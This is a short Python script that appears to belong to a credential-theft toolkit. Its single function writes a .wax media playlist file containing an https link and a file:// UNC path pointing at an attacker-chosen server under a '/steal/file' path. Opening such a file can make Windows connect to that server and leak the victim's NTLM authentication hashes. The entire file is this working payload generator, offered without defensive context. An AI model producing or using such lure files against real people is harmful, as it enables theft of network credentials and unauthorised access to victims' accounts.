#!/usr/bin/env python
# -*- coding: utf-8 -*-


def create_wax(generate, server, filename):
    file = open(filename, "w")
    file.write(
        """https://"""
        + server
        + """/test
file://\\\\"""
        + server
        + """/steal/file"""
    )
    file.close()
    print("Created: " + filename + " (OPEN)")
